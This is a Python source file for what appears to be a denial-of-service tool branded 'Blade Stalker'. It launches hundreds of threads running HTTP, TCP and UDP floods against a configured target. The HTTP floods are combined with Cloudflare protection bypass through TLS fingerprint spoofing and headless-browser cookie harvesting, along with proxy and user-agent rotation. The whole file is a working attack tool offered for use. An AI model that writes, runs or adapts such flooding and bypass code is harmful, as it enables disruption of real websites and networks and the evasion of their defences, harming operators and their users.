import requests
import random
import threading
import ssl
import socket
import os
import time
import json
from tls_client import Session  # TLS Fingerprint Evasion
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

# Figlet-style Banner
def print_banner():
    banner = """
██████╗ ██╗      █████╗ ██████╗ ███████╗    ███████╗████████╗ █████╗ ██╗     ██╗  ██╗███████╗██████╗ 
██╔══██╗██║     ██╔══██╗██╔══██╗██╔════╝    ██╔════╝╚══██╔══╝██╔══██╗██║     ██║ ██╔╝██╔════╝██╔══██╗
██████╔╝██║     ███████║██████╔╝███████╗    ███████╗   ██║   ███████║██║     █████╔╝ █████╗  ██████╔╝
██╔═══╝ ██║     ██╔══██║██╔═══╝ ╚════██║    ╚════██║   ██║   ██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██║     ███████╗██║  ██║██║     ███████║    ███████║   ██║   ██║  ██║███████╗██║  ██╗███████╗██║  ██║
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝    ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                          Code by @mrbladestalker | Telegram: @mrbladestalker0093
"""
    print(f"\033[91m{banner}\033[0m")

# Target Configuration
TARGET_URL = "http://example.com"
TARGET_IP = "1.1.1.1"
TARGET_PORT = 443
THREADS = 500

# Proxy List
PROXY_LIST = ["socks5://127.0.0.1:9050", "http://45.76.1.23:8080", "socks5://192.168.1.100:1080"]

# User-Agents & Referers
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0)",
]
REFERERS = ["https://google.com", "https://bing.com", "https://yahoo.com"]

# Cloudflare Bypass - Cookie Extraction
def get_cloudflare_cookies():
    try:
        session = Session(client_identifier="chrome_120")  # TLS Fingerprint Evasion
        response = session.get(TARGET_URL)
        cookies = session.cookies.get_dict()
        if "cf_clearance" in cookies:
            print(f"\033[92m[✔] Cloudflare Bypassed | Clearance Cookie: {cookies['cf_clearance']}\033[0m")
        return cookies
    except Exception as e:
        print(f"\033[91m[!] Cloudflare Bypass Error: {e}\033[0m")
        return {}

# Cloudflare Challenge Solving
def solve_cloudflare_challenge():
    try:
        options = Options()
        options.add_argument("--headless")
        driver = webdriver.Chrome(options=options)
        driver.get(TARGET_URL)
        time.sleep(6)  # Wait for Cloudflare to verify browser
        cookies = driver.get_cookies()
        driver.quit()
        for cookie in cookies:
            if cookie["name"] == "cf_clearance":
                print(f"\033[92m[✔] Cloudflare Challenge Solved | Clearance Cookie: {cookie['value']}\033[0m")
                return {cookie["name"]: cookie["value"]}
    except Exception as e:
        print(f"\033[91m[!] Cloudflare Challenge Error: {e}\033[0m")
        return {}

# HTTP Flood Attack with Cloudflare Bypass
def http_flood():
    cf_cookies = get_cloudflare_cookies()
    while True:
        try:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Referer": random.choice(REFERERS),
                "Cache-Control": "no-cache",
            }
            response = requests.get(TARGET_URL, headers=headers, cookies=cf_cookies, timeout=5)
            print(f"\033[92m[✔] HTTP Flood -> Status: {response.status_code}\033[0m")
        except Exception as e:
            print(f"\033[91m[!] HTTP Flood Error: {e}\033[0m")

# TCP Flood Attack
def tcp_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            payload = os.urandom(1024)  # Random Data
            s.send(payload)
            print(f"\033[92m[✔] TCP Flood -> Sent {len(payload)} bytes to {TARGET_IP}:{TARGET_PORT}\033[0m")
            s.close()
        except Exception as e:
            print(f"\033[91m[!] TCP Flood Error: {e}\033[0m")

# UDP Flood Attack
def udp_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = os.urandom(1024)  # Random Data
            s.sendto(payload, (TARGET_IP, TARGET_PORT))
            print(f"\033[92m[✔] UDP Flood -> Sent {len(payload)} bytes to {TARGET_IP}:{TARGET_PORT}\033[0m")
        except Exception as e:
            print(f"\033[91m[!] UDP Flood Error: {e}\033[0m")

# Multi-threaded Execution
def start_attack():
    print_banner()  # Display Banner First
    print("\033[91m[!] Launching Mr.Blade Stalker Attack with Cloudflare Bypass...\033[0m")

    # Get Cloudflare Cookies
    cf_cookies = get_cloudflare_cookies()

    # Challenge Solving
    threading.Thread(target=solve_cloudflare_challenge).start()

    # Launch HTTP Flood with Cloudflare Bypass
    for _ in range(THREADS // 3):
        threading.Thread(target=http_flood).start()

    # Launch TCP Flood
    for _ in range(THREADS // 3):
        threading.Thread(target=tcp_flood).start()

    # Launch UDP Flood
    for _ in range(THREADS // 3):
        threading.Thread(target=udp_flood).start()

if __name__ == "__main__":
    start_attack()